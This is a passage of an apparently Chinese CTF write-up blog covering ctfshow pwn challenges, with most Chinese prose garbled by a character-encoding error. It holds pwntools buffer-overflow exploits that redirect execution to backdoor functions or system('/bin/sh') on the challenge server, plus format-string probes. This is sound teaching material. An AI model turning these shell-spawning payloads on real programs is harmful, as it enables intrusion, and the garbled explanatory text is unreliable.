</h2><p>Áé∞Âú®FORTIFY_SOURCE=1ÔºåÂç≥Fortify  ÂäüËÉΩÂ∑≤ÂêØÁî®„ÄÇÈôÑ‰ª∂ÊòØ64‰ΩçelfÔºåÁî®IDAÊâìÂºÄÔºåÂèØ‰ª•ÁúãÂà∞‰∏äÈ¢ò‰∏≠ÁöÑstrcpyË¢´ÊõøÊç¢‰∏∫__strcpy_chkÔºåmemcpyË¢´ÊõøÊç¢‰∏∫__memcpy_chkÔºå‰πüÂä†‰∏ä‰∫Ü11LLÁöÑÈôêÂà∂Èò≤Ê≠¢Ê∫¢Âá∫ÔºåËøôÊòØÁ¨¨‰∏ÄÁ∫ßFortifyÁöÑÁâπÂæÅ</p>
<ul>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">`</span><span class="nf">__memcpy_chk</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="n">v5</span><span class="p">,</span><span class="w"> </span><span class="mi">11</span><span class="n">LL</span><span class="p">)</span><span class="o">`</span><span class="w"> </span><span class="err">‰∏≠Ôºö</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="w"> </span><span class="o">**`</span><span class="n">buf1</span><span class="o">`**</span><span class="err">ÔºöÁõÆÊ†áÁºìÂÜ≤Âå∫ÔºåÊï∞ÊçÆÂ∞ÜË¢´Â§çÂà∂Âà∞ËøôÈáå„ÄÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="w"> </span><span class="o">**`</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">`**</span><span class="err">ÔºöÊ∫êÁºìÂÜ≤Âå∫ÔºåÊï∞ÊçÆ‰ªéËøôÈáåÂ§çÂà∂ÔºàÈÄöÂ∏∏ÊòØÂëΩ‰ª§Ë°åÂèÇÊï∞ÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞Ôºâ„ÄÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="w"> </span><span class="o">**`</span><span class="n">v5</span><span class="o">`**</span><span class="err">ÔºöË¶ÅÂ§çÂà∂ÁöÑÂ≠óËäÇÊï∞„ÄÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="w"> </span><span class="o">**`</span><span class="mi">11</span><span class="n">LL</span><span class="o">`**</span><span class="err">ÔºöÁõÆÊ†áÁºìÂÜ≤Âå∫</span><span class="w"> </span><span class="o">`</span><span class="n">buf1</span><span class="o">`</span><span class="w"> </span><span class="err">ÁöÑÂÆûÈôÖÂ§ßÂ∞èÔºà</span><span class="mi">11</span><span class="w"> </span><span class="err">Â≠óËäÇÔºâ„ÄÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">__memcpy_chk</span><span class="w"> </span><span class="err">ÁöÑÂäüËÉΩÊòØÂ∞Ü</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="err">‰∏≠ÁöÑ</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="err">‰∏™Â≠óËäÇÂ§çÂà∂Âà∞</span><span class="w"> </span><span class="n">buf1</span><span class="w"> </span><span class="err">‰∏≠Ôºå‰ΩÜÂú®Â§çÂà∂‰πãÂâç‰ºöÊ£ÄÊü•ÁõÆÊ†áÁºìÂÜ≤Âå∫</span><span class="w"> </span><span class="n">buf1</span><span class="w"> </span><span class="err">ÁöÑÂ§ßÂ∞èÊòØÂê¶Ë∂≥Â§üÔºö</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">Â¶ÇÊûú</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="err">Ë∂ÖËøá‰∫Ü</span><span class="w"> </span><span class="n">buf1</span><span class="w"> </span><span class="err">ÁöÑÂ§ßÂ∞èÔºà</span><span class="mi">11</span><span class="w"> </span><span class="err">Â≠óËäÇÔºâÔºå</span><span class="n">__memcpy_chk</span><span class="w"> </span><span class="err">‰ºöËß¶ÂèëÁºìÂÜ≤Âå∫Ê∫¢Âá∫‰øùÊä§Êú∫Âà∂ÔºåÁªàÊ≠¢Á®ãÂ∫èÂπ∂ËæìÂá∫ÈîôËØØ‰ø°ÊÅØ„ÄÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">Â¶ÇÊûú</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="err">Â∞è‰∫éÊàñÁ≠â‰∫é</span><span class="w"> </span><span class="n">buf1</span><span class="w"> </span><span class="err">ÁöÑÂ§ßÂ∞èÔºåÂàôÊ≠£Â∏∏ÊâßË°åÂ§çÂà∂Êìç‰Ωú„ÄÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">__strcpy_chk</span><span class="w"> </span><span class="err">ÁöÑÂäüËÉΩÊòØÂ∞Ü</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="err">‰∏≠ÁöÑÂ≠óÁ¨¶‰∏≤Â§çÂà∂Âà∞</span><span class="w"> </span><span class="n">buf2</span><span class="w"> </span><span class="err">‰∏≠Ôºå‰ΩÜÂú®Â§çÂà∂‰πãÂâç‰ºöÊ£ÄÊü•ÁõÆÊ†áÁºìÂÜ≤Âå∫</span><span class="w"> </span><span class="n">buf2</span><span class="w"> </span><span class="err">ÁöÑÂ§ßÂ∞èÊòØÂê¶Ë∂≥Â§üÔºö</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">Â¶ÇÊûú</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="err">ÁöÑÈïøÂ∫¶ÔºàÂåÖÊã¨Â≠óÁ¨¶‰∏≤ÁªìÊùüÁ¨¶</span><span class="w"> </span><span class="err">\</span><span class="mi">0</span><span class="err">ÔºâË∂ÖËøá‰∫Ü</span><span class="w"> </span><span class="n">buf2</span><span class="w"> </span><span class="err">ÁöÑÂ§ßÂ∞èÔºà</span><span class="mi">11</span><span class="w"> </span><span class="err">Â≠óËäÇÔºâÔºå</span><span class="n">__strcpy_chk</span><span class="w"> </span><span class="err">‰ºöËß¶ÂèëÁºìÂÜ≤Âå∫Ê∫¢Âá∫‰øùÊä§Êú∫Âà∂ÔºåÁªàÊ≠¢Á®ãÂ∫èÂπ∂ËæìÂá∫ÈîôËØØ‰ø°ÊÅØ„ÄÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">Â¶ÇÊûú</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="err">ÁöÑÈïøÂ∫¶Â∞è‰∫éÊàñÁ≠â‰∫é</span><span class="w"> </span><span class="n">buf2</span><span class="w"> </span><span class="err">ÁöÑÂ§ßÂ∞èÔºåÂàôÊ≠£Â∏∏ÊâßË°åÂ§çÂà∂Êìç‰Ωú„ÄÇ</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<p>ÂâçËÄÖÊòØÂ∏¶ÁºìÂÜ≤Âå∫ÁöÑÂÜÖÂ≠òÂ§çÂà∂ÂáΩÊï∞ÔºåÂêéËÄÖÊòØÂ∏¶ÁºìÂÜ≤Âå∫ÁöÑÂ≠óÁ¨¶‰∏≤Â§çÂà∂ÂáΩÊï∞</p>
<h2 id="pwn34">pwn34
</h2><p>Ê≠§Êó∂FORTIFY_SOURCE=2ÔºåÂêØÁî®‰∫ÜÁ¨¨‰∫åÁ∫ßFortifyÔºåÁî®IDAÊâìÂºÄÈôÑ‰ª∂Êü•ÁúãÔºåÊ≠§Êó∂printfÂáΩÊï∞‰πüË¢´ÊõøÊç¢Êàê‰∫Ü__printf_chkÔºåUndefinedÂáΩÊï∞ÂâçÁöÑifÊù°‰ª∂‰πüÊ≤°‰∫Ü</p>
<h2 id="pwn35">pwn35
</h2><p>sprintfÂ∞±ÊòØÊääÊ†ºÂºèÂåñÁöÑÊï∞ÊçÆÂÜôÂÖ•Âà∞Êüê‰∏™Â≠óÁ¨¶‰∏≤‰∏≠„ÄÇËøîÂõûÂÄºÂ≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶„ÄÇ</p>
<p>fprintf()ÂáΩÊï∞Ê†πÊçÆÊåáÂÆöÁöÑformat(Ê†ºÂºè)ÂèëÈÄÅ‰ø°ÊÅØ(ÂèÇÊï∞)Âà∞Áî±stream(ÊµÅ)ÊåáÂÆöÁöÑÊñá‰ª∂.Âõ†Ê≠§fprintf()ÂèØ‰ª•‰ΩøÂæó‰ø°ÊÅØËæìÂá∫Âà∞ÊåáÂÆöÁöÑÊñá‰ª∂„ÄÇ</p>
<p>stdout, stdin, stderrÁöÑ‰∏≠ÊñáÂêçÂ≠óÂàÜÂà´ÊòØÊ†áÂáÜËæìÂá∫ÔºåÊ†áÂáÜËæìÂÖ•ÂíåÊ†áÂáÜÈîôËØØ„ÄÇ</p>
<p>stdoutÊòØË°åÁºìÂÜ≤ÁöÑÔºå‰ªñÁöÑËæìÂá∫‰ºöÊîæÂú®‰∏Ä‰∏™bufferÈáåÈù¢ÔºåÂè™ÊúâÂà∞Êç¢Ë°åÁöÑÊó∂ÂÄôÔºåÊâç‰ºöËæìÂá∫Âà∞Â±èÂπï„ÄÇËÄåstderrÊòØÊó†ÁºìÂÜ≤ÁöÑÔºå‰ºöÁõ¥Êé•ËæìÂá∫Ôºå</p>
<p>fflush()Âà∑Êñ∞ÁºìÂÜ≤Âå∫</p>
<p>Ê≥®ÊÑèÂà∞signal(11, (__sighandler_t)sigsegv_handler);Signal 11ÈîôËØØÔºå‰πüÁß∞‰∏∫‚ÄúSegmentation fault‚ÄùÔºåÊòØ‰∏ÄÁßçÁî®‰∫éÊèêÁ§∫UnixÁ≥ªÁªüÁ®ãÂ∫èÂá∫Áé∞ÈîôËØØÁöÑ‰ø°Âè∑„ÄÇÂΩìÂ∫îÁî®Á®ãÂ∫èËØïÂõæÂØπÊó†ÊùÉËÆøÈóÆÁöÑÂÜÖÂ≠òÂú∞ÂùÄËøõË°åËØªÂÜôÊìç‰ΩúÊó∂,‰ºöË∞ÉÁî® sigsegv_handler ÂáΩÊï∞,sigsegv_handler ÂáΩÊï∞ ‰ºöÊäästderrÊâìÂç∞ËæìÂá∫,Âç≥Â∞ÜflagÁöÑÂÄºÊâìÂç∞ËæìÂá∫ÈÇ£‰πàÊàë‰ª¨Áõ¥Êé•ËæìÂÖ•Ë∂ÖÈïøÊï∞ÊçÆÂ∞±‰ºöÊ∫¢Âá∫ÔºåÁ®ãÂ∫èÂ∞±‰ºöÂ¥©Ê∫ÉËøõËÄåÊâìÂç∞Âá∫flag
strcpyÂáΩÊï∞ÔºàstrcpyÂáΩÊï∞Ê≤°ÊúâÈïøÂ∫¶ÈôêÂà∂ÔºâËøô‰∏™ÂáΩÊï∞ÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÂèØ‰ª•Áî®Êù•Âà©Áî®Ê∫¢Âá∫ÁöÑÂáΩÊï∞„ÄÇÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Âú®ËøôÈáåËøõË°åÊ†àÊ∫¢Âá∫„ÄÇ</p>
<p><img src="/p/ctfshow-pwn/image-20250302172158557.png"
	width="890"
	height="228"
	srcset="/p/ctfshow-pwn/image-20250302172158557_hu_ad913b62430e2044.png 480w, /p/ctfshow-pwn/image-20250302172158557_hu_21c8acd8499e0175.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="390"
		data-flex-basis="936px"
	
></p>
<h2 id="pwn36">pwn36
</h2><p>‰ªÖÂºÄ‰∫ÜRELRO</p>
<p>Âç±Èô©ÂáΩÊï∞gets()ÂáΩÊï∞</p>
<p><img src="/p/ctfshow-pwn/image-20250302180333090.png"
	width="704"
	height="231"
	srcset="/p/ctfshow-pwn/image-20250302180333090_hu_67bb355bf5f6e0f.png 480w, /p/ctfshow-pwn/image-20250302180333090_hu_f017ab0b0bce32fb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="304"
		data-flex-basis="731px"
	
></p>
<p>È¢òÁõÆËØ¥‰∫ÜÔºåÂà©Áî®ÂêéÈó®ÂáΩÊï∞ÔºåÊâæÂà∞get_flagÂáΩÊï∞ÁöÑ‰ΩçÁΩÆÔºåÂíåÂÅèÁßªÈáè0x28ÔºåebpÂú®s‰∏äÈù¢0x28Â§Ñ</p>
<p>Ê†àÁªìÊûÑ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                           +-----------------+
</span></span><span class="line"><span class="cl">                                           |     retaddr     |
</span></span><span class="line"><span class="cl">                                           +-----------------+
</span></span><span class="line"><span class="cl">                                           |     saved ebp   |
</span></span><span class="line"><span class="cl">                                    ebp---&gt;+-----------------+
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                              s,ebp-0x14--&gt;+-----------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë¶ÜÁõñÂêé</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                           +-----------------+
</span></span><span class="line"><span class="cl">                                           |    0x0804843B   |
</span></span><span class="line"><span class="cl">                                           +-----------------+
</span></span><span class="line"><span class="cl">                                           |       bbbb      |
</span></span><span class="line"><span class="cl">                                    ebp---&gt;+-----------------+
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                              s,ebp-0x14--&gt;+-----------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28197</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span><span class="mh">0x28</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag_address</span> <span class="o">=</span> <span class="mh">0x08048586</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn37">pwn37
</h2><p>system(&quot;/bin/sh&quot;)Ë∞ÉÁî®ÈªòËÆ§shellÊù•‰º†ÂÖ•ÂëΩ‰ª§Â≠óÁ¨¶‰∏≤ÔºåÂíå‰∏äÈù¢‰∏ÄÊ†∑</p>
<h2 id="pwn38">pwn38
</h2><p>64‰ΩçÔºåÊ≥®ÊÑèÂ†ÜÊ†àÂπ≥Ë°°ÔºÅ</p>
<p>ÂèØ‰ª•Áõ¥Êé•Áî®gdbÁúãÊ±áÁºñ‰ª£Á†Å</p>
<p>gdb pwn</p>
<p>disass backdoor</p>
<p>cyclic 200</p>
<p>Â°´ÂÖÖÂ≠óÁ¨¶‰∏≤</p>
<p><img src="/p/ctfshow-pwn/image-20250302200421128.png"
	width="2323"
	height="752"
	srcset="/p/ctfshow-pwn/image-20250302200421128_hu_ac9d010907800739.png 480w, /p/ctfshow-pwn/image-20250302200421128_hu_ea0ae523849d4168.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="308"
		data-flex-basis="741px"
	
></p>
<p>cyclic -l Âú∞ÂùÄ</p>
<p>ÁúãÂÅèÁßªÔºåÂÅèÁßªÈáèÊúÄÂêéË¶ÅÂä†8ÔºàÂ†ÜÊ†àÂπ≥Ë°°Ôºâ</p>
<p>IDA‰∏≠ÊâæretÂú∞ÂùÄ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="s2">&#34;28220&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0xa</span> <span class="o">+</span> <span class="mh">0x8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x0000000000400287</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">backdoor_addr</span> <span class="o">=</span> <span class="mh">0x0000000000400657</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn39">pwn39
</h2><p>Ê≤°ÊúâÂêéÈó®ÂáΩÊï∞Ôºå‰ΩÜÊòØÊúâhint</p>
<p><img src="C:%5cUsers%5c%e6%b0%b4%e8%8d%89%e5%a7%90%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250302202433344.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302202433344"
	
	
></p>
<p>ÂæóÂà∞ÂÅèÁßªÈáè</p>
<p><img src="/p/ctfshow-pwn/image-20250302201846192.png"
	width="2269"
	height="157"
	srcset="/p/ctfshow-pwn/image-20250302201846192_hu_75fb21304c7ff7d5.png 480w, /p/ctfshow-pwn/image-20250302201846192_hu_7e1dc2da6c80ea9f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1445"
		data-flex-basis="3468px"
	
></p>
<p>ÊãøÂà∞/bin/shÁöÑÂú∞ÂùÄ</p>
<p><img src="/p/ctfshow-pwn/image-20250302201816379.png"
	width="1651"
	height="316"
	srcset="/p/ctfshow-pwn/image-20250302201816379_hu_5a861246d1420afe.png 480w, /p/ctfshow-pwn/image-20250302201816379_hu_64d9aa6b1a90dca1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="522"
		data-flex-basis="1253px"
	
></p>
<p>ÊãøÂà∞systemÁöÑÂú∞ÂùÄ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">objdump -d -j .plt pwn
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn/image-20250302201917309.png"
	width="2061"
	height="1053"
	srcset="/p/ctfshow-pwn/image-20250302201917309_hu_1cf55e8384c99b51.png 480w, /p/ctfshow-pwn/image-20250302201917309_hu_379509f04d0fecc8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="469px"
	
></p>
<p>Êü•ÁúãIDA‰πüÂèØ</p>
<p><img src="/p/ctfshow-pwn/image-20250302202604110.png"
	width="1946"
	height="741"
	srcset="/p/ctfshow-pwn/image-20250302202604110_hu_1801f4ee18b486e4.png 480w, /p/ctfshow-pwn/image-20250302202604110_hu_3f58237f4c71ed38.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="262"
		data-flex-basis="630px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="s2">&#34;28241&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">22</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x08048750</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x080483a0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span><span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë°•ÂÖÖ‰∏Ä‰∏ãÔºö‰ª£Ë°®ÊòØsystemÂáΩÊï∞ÁöÑËøîÂõûÂú∞ÂùÄÔºåÁî±‰∫é‰∏çÈúÄË¶ÅËøîÂõûÂà∞Êüê‰∏™Âú∞ÊñπÔºåÊâÄ‰ª•Áõ¥Êé•‰ΩøÁî®bbbb‰ª£ÊõøÂõõ‰∏™Â≠óËäÇ</p>
<h2 id="pwn94">pwn94
</h2><p>ÊâæÂà∞Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑ‰ΩçÁΩÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aaaa-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x
</span></span><span class="line"><span class="cl">aaaa-ff9474a8-64-80486e5-1-0-61616161-2d78252d-252d7825-78252d78-2d78252d-252d7825
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>aaaa</code>ÔºöËøôÊòØ‰∏Ä‰∏™Âõ∫ÂÆöÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÁî®‰∫éÂú®Ê†à‰∏äÊ†áËÆ∞‰∏Ä‰∏™Â∑≤Áü•ÂÄºÔºà<code>0x61616161</code>ÔºåÂç≥<code>aaaa</code>ÁöÑASCIIÁ†ÅÔºâ„ÄÇ</li>
<li><code>-%x</code>Ôºö<code>%x</code>ÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰∏≠ÁöÑÂç†‰ΩçÁ¨¶ÔºåÁî®‰∫é‰ª•ÂçÅÂÖ≠ËøõÂà∂Ê†ºÂºèÊâìÂç∞Ê†à‰∏äÁöÑÂÄº„ÄÇ</li>
</ul>
<p>È™åËØÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aaaa%6$p
</span></span><span class="line"><span class="cl">aaaa0x61616161
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>%6$p</code>ÔºöËøôÊòØ‰∏Ä‰∏™Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Âç†‰ΩçÁ¨¶ÔºåË°®Á§∫ÊâìÂç∞Ê†à‰∏äÁ¨¨6‰∏™‰ΩçÁΩÆÁöÑÂÄºÔºà‰ª•ÊåáÈíàÊ†ºÂºèÔºâ„ÄÇ</p>
